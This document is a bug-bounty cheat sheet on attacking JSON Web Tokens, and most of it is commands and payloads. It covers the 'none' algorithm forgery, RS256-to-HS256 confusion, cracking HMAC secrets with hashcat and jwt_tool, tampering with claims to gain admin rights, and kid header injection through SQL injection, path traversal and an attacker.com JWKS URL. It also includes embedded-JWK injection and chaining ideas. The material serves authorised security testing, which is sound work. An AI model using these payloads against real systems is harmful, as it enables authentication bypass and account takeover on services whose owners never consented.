---
tags: [bugbounty, vuln/jwt, cheatsheet, p1, p2, p3]
aliases: [JWT, JSON Web Token, JWT attacks]
cssclasses: [bb-hunter]
updated: 2026-04-21
---

# JWT Vulnerabilities

> [!tldr] Hunter Summary
> **What:** Forge or manipulate JSON Web Tokens to bypass authentication or escalate privileges.
> **Impact:** Auth bypass, privilege escalation, ATO — P1 when exploitable.
> **Best targets:** Any app using JWT (look for `eyJ` in cookies or Authorization header).
> **Time to triage:** Decode the token, check algorithm and claims, 5–10 min.

---

## Where to Hunt

| Signal | Look for |
|--------|----------|
| Token prefix | `eyJ` in cookies, `Authorization: Bearer eyJ...` headers |
| URL tokens | `?token=eyJ...`, `?auth=eyJ...` |
| Local storage | JS `localStorage.getItem('token')` |
| Header algorithms | `alg: HS256`, `alg: RS256`, `alg: none` |

---

## Step-by-Step Hunt

### Step 1 — Decode and analyze
```bash
# Decode JWT (no verification needed to read)
# Format: header.payload.signature (base64url encoded)

# Manual decode
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d 2>/dev/null
# Or:
jwt_tool TOKEN -d

# Online: https://jwt.io
```

Look at:
- `alg` — what algorithm? (`HS256`, `RS256`, `none`, `ES256`)
- `sub`, `user_id`, `role`, `email` — what claims are there?
- `exp` — expiry? Test with expired tokens.
- `kid` — key ID? (injection vector)

### Step 2 — None algorithm attack
```bash
# Change alg to "none", remove signature
jwt_tool TOKEN -X a
# Or manually:
# Header: {"alg":"none","typ":"JWT"}
# Payload: modify as needed  
# Signature: (empty — just trailing dot)

# Variants:
# alg: "None"  "NONE"  "nOnE"  "none "
```

### Step 3 — HS256 algorithm confusion (if RS256)
If server uses RS256 but accepts HS256:
```bash
# Get the server's public key (from /jwks.json, /.well-known/jwks.json)
curl https://target.com/.well-known/jwks.json

# Sign JWT with HMAC using the public key as the secret
jwt_tool TOKEN -X k -pk public_key.pem
```

### Step 4 — Weak HMAC secret (HS256 brute force)
```bash
# Brute force HS256 secret
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt

# Or jwt_tool
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt

# Common secrets to try:
# secret  password  123456  your-256-bit-secret  jwt_secret  
# SECRET_KEY  supersecret  development  test
```

### Step 5 — Modify claims after cracking
```bash
# Change role
jwt_tool TOKEN -T -p '{"sub":"admin","role":"admin"}'

# Change user ID
jwt_tool TOKEN -T -p '{"user_id": 1}'

# Sign with cracked secret
jwt_tool TOKEN -S hs256 -p 'SECRET'
```

### Step 6 — `kid` header injection
```bash
# kid = key ID header — server uses this to look up signing key

# SQL injection in kid
{"alg":"HS256","kid":"key' UNION SELECT 'attacker_secret'--"}
# Then sign with 'attacker_secret'

# Path traversal in kid  
{"alg":"HS256","kid":"../../../dev/null"}
# Sign with empty string (null byte file)

# SSRF via kid URL
{"alg":"RS256","kid":"https://attacker.com/jwks.json"}
# Host your own JWKS with your keys
```

### Step 7 — Embedded JWK injection (CVE-2018-0114 pattern)
```bash
# Add your own "jwk" public key to the header
# Server uses embedded key instead of configured one
jwt_tool TOKEN -X i
# Embeds your own generated key pair
```

### Step 8 — Test claim modification
Even without cracking, test:
- Change `role` from `user` to `admin`
- Change `email` to another user's email
- Change `sub` to `1` or `admin`
- Increase `exp` (expiry)
- Remove `iss` claim

---

## Payload Quick Ref

```
# Decode header
echo "HEADER_BASE64" | base64 -d

# None alg (header: {"alg":"none","typ":"JWT"})
HEADER: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
# Remove signature, keep trailing dot:
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.

# HS256 brute
hashcat -a 0 -m 16500 "eyJ...token...abc" rockyou.txt

# JWKS endpoint fingerprint
/.well-known/jwks.json
/api/keys
/oauth/jwks
/jwks
/jwks.json
```

---

## 2025-2026 Updates

> [!info] New JWT surface (2025-2026)
> - **EdDSA confusion:** Some libraries vulnerable to algorithm confusion with Ed25519 (CVE-2022-21449 pattern repeated in newer libs)
> - **JWT injection via `x5c` and `x5u` headers:** Can force server to fetch attacker-controlled certificate
> - **AI app JWT misuse:** AI SaaS apps often use JWTs for tool authorization with overly broad scopes — look for `scope: *` or `permissions: all`
> - **Short-lived token bypass:** App reissues token immediately on expired check — replay the issuance flow instead of the expired token
> - **Refresh token → JWT escalation:** Refresh token with higher privileges than issued JWT — modify claims in refresh request

---

## Chain Ideas

| JWT bug → | Result |
|-----------|--------|
| None algorithm | → Auth bypass → any user access |
| Weak secret | → Forge admin role → admin takeover |
| kid SQL injection | → Sign with controlled key → full auth bypass |
| Algorithm confusion | → Bypass RS256 with HS256 using public key |
| Claim modification + weak sig | → Privilege escalation |

---

## Tools

| Tool | Use |
|------|-----|
| `jwt_tool` | Swiss army knife for JWT testing |
| `hashcat -m 16500` | HS256 secret brute force |
| `john` | Alternative JWT cracker |
| Burp JWT Editor | Visual JWT manipulation extension |
| https://jwt.io | Decode and view tokens |

---

## References

- PortSwigger JWT attacks — https://portswigger.net/web-security/jwt
- jwt_tool — https://github.com/ticarpi/jwt_tool
- PayloadsAllTheThings JWT — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token
